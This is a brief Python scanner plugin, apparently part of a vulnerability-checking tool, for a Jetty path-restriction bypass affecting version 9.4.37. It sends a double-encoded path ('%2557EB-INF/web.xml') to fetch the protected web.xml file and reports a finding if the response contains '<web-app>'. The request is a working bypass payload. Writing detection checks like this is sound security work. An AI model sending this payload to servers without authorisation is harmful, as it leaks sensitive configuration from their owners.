# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Jetty URI路径限制绕过漏洞",
        "description": "Jetty 9.4.37引入对RFC3986的新实现，而URL编码的.字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过%2e来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='GET',
            path='./static?/%2557EB-INF/web.xml',
            timeout=15
        )
        if r.status_code == 200 and '<web-app>' in r.text:
            return {"LoopholeInfo": self.__info__}
